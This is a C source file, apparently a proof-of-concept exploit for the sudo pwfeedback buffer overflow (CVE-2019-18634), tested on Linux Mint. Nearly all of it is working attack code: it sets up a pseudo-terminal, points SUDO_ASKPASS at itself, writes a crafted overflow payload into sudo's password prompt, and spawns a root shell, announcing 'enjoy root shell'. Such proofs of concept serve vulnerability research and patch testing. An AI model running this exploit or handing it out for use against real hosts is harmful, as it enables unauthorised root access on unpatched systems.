/*
 * First we need to create a pseudo-terminal (pty); this is important important
 * t's the best (only?) way to achive the right part of sudo code that we can
 * use to exploit.
 * 
 * We'll take advantage of tgetpass.c:110, so we need to force SUDO_ASKPASS
 * variable without using -A option of sudo. So we'll execute "sudo -S blah"
 * and force sudo enter on tgetpass.c:104 if but evaluate false on line 106.
 * Then it will evalutate true on tgetpass.c:114 and execute sudo_askpass func.
 * Tested on Linux Mint 19.1
 *
 * created by cardinal3 (vulnerability discovered by Joe Vennix)
 *
 * CVE-2019-18634
 *
 */

#define _GNU_SOURCE

#define BUFSIZE                682
#define MY_SHELL_VARIABLE      "PLEASE_EXEC_MY_SHELL"
#define MY_SHELL_VALUE         "/bin/sh"

#include <stdio.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <fcntl.h>

#define PLEASE_EXEC_MY_SHELL   MY_SHELL_VARIABLE"="MY_SHELL_VALUE

int main(void)
{
    int amaster, aslave;
    char* pty_name;
    char* sudo_callback;
    pid_t cpid;
    struct termios atermios;
    int saved_errno;


    if ((sudo_callback = getenv(MY_SHELL_VARIABLE)) != NULL) {
        char* a[] = { 0 };
        char* e[] = { "TERM=xterm", 0 } ;

        // closing pipes and sudo descriptors
        for (int i=0; i<5; i++)
            if (i!=STDERR_FILENO)
                close(i);

        // and reopening them from STERR again
        sleep(1);
        for (int i=0; i<2; i++)
           dup(STDERR_FILENO);
        if(getuid()==0)
            dprintf(STDERR_FILENO, "[+] w00t w00t enjoy root shell :)\n");
        else
            dprintf(STDERR_FILENO, "[-] something wrong, i'm not root\n");

        //system("tput -T xterm reset");
        execve("/bin/sh",a,e);
    }

    amaster = posix_openpt(O_RDWR);

    if (grantpt(amaster) == -1) {
            saved_errno = errno;
            close(amaster);
            err(saved_errno, "error grantpt");
    }

    if (unlockpt(amaster) == -1) {
            saved_errno = errno;
            close(amaster);
            err(saved_errno, "error unlockpt");
    }

    pty_name = ptsname(amaster);
    if (pty_name == NULL) {
        saved_errno = errno;
        close(amaster);
        err(saved_errno, "error ptsname");
    }

    aslave = open(pty_name, O_NOCTTY | O_RDONLY); // O_NONBLOCK

    cpid = fork();
    if (cpid < 0)
        err(errno, "error fork");


    /* child */
    if (cpid == 0) {
        char exename[100]={0}; // increase if needed
        char* sudo[4] = { "/usr/bin/sudo", "-S", "cabelo", 0 };
        char* envp[3];
        char* sudo_askpass;
        unsigned int s;

        if (readlink("/proc/self/exe", exename, sizeof(exename)) < 0)
            err(errno, "error readlink");

        s = strlen("SUDO_ASKPASS=") + strlen(exename) + 1;
        sudo_askpass = (char *)malloc(s);
        if (strncat(strcpy(sudo_askpass, "SUDO_ASKPASS="), exename, s) == NULL)
            err(errno, "error strncat");

        envp[0] = sudo_askpass;
        envp[1] = PLEASE_EXEC_MY_SHELL;
        envp[2] = (char *)0;
        close(amaster);

        if (dup2(aslave, STDIN_FILENO) == -1)
            err(errno, "dup2 error");

        execve(sudo[0], sudo, envp);
    }

    /* parent */
    if (cpid > 0) {
        int i=0,j=0;
        int wstatus;
        pid_t w;
        char payload[BUFSIZE]={0};

        close(aslave);

        /*
         * below we build the payload that will trigger the vulnerability.
         * we need to fill the following BSS variables: buf + askpass + signo
         * + se_state + user_details. 
         * FIXME: corrigir o texto e explicar melhor
         */
        payload[96]=0x15; j=97;
        payload[j+96]=0x15; j+=97;
        j+=80;
        payload[j+16]=0x15; j+=17;
        payload[j+96]=0x15; j+=97;
        payload[j+96]=0x15; j+=97;
        payload[j+96]=0x15; j+=97;
        j+=48;
        payload[j]=0x05;
        j+=34;
        payload[j+17]=0x15; j+=17;
        payload[j++]=0x0d;
        payload[j++]=0x0a;

        dprintf(STDERR_FILENO, "[+] sending payload\n");
        sleep(1);
        write(amaster, payload, BUFSIZE);

        if (waitpid(cpid, &wstatus, WUNTRACED | WCONTINUED) == -1) {
           perror("waitpid");
           return -1;
        }

        return wstatus;
    }
}
